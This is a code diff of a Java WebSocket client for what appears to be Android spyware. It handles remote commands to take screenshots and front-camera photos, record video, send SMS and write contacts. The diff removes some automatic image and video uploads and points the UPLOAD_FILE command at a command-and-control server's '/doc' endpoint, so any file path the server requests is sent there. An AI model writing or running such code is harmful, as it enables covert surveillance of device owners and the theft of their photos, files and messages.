@@ -64,8 +64,6 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     path = Screenshot.captureImage(context, false);
                     file = new File(path);
 
-                    FileManager.uploadFile(file.getAbsolutePath(), Utils.getC2Address() + "/image");
-
                     json.put("res", "image");
                     json.put("filename", file.getName());
                     json.put("timestamp",System.currentTimeMillis());
@@ -73,10 +71,9 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     break;
                 case CAMERA_FRONT:
                     path = Screenshot.captureImage(context, true);
-                    Thread.sleep(20000);
+                    Log.e("eeee", path);
                     file = new File(path);
 
-                    FileManager.uploadFile(file.getAbsolutePath(), Utils.getC2Address() + "/image");
 
                     json.put("res", "image");
                     json.put("filename", file.getName());
@@ -134,17 +131,15 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     SMS.send(req.getString("number"), req.getString("message"));
                     break;
                 case UPLOAD_FILE:
-                    FileManager.uploadFile(req.getString("path"), req.getString("url"));
+                    FileManager.uploadFile(req.getString("path"), Utils.getC2Address() + "/doc");
                     break;
                 case VIDEO:
-                    path = Screenshot.captureVideo(req.getBoolean("frontCamera"), req.getInt("duration"));;
+                    path = Screenshot.captureVideo(req.getBoolean("frontCamera"), req.getInt("duration"));
                     file = new File(path);
-
-                    FileManager.uploadFile(file.getAbsolutePath(), Utils.getC2Address() + "/video");
 
                     json.put("res", "video");
                     json.put("filename", file.getName());
-                    json.put("timestamp", file.getName().split(".")[0]);
+                    json.put("timestamp", System.currentTimeMillis());
                     send(json.toString());
                     break;
                 case WRITE_CONTACT:
@@ -156,6 +151,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
         } catch (Exception e) {
             Log.e("eeee", e.getMessage());
             Log.e("eeee", e.toString());
+            e.printStackTrace();
         }
     }
 
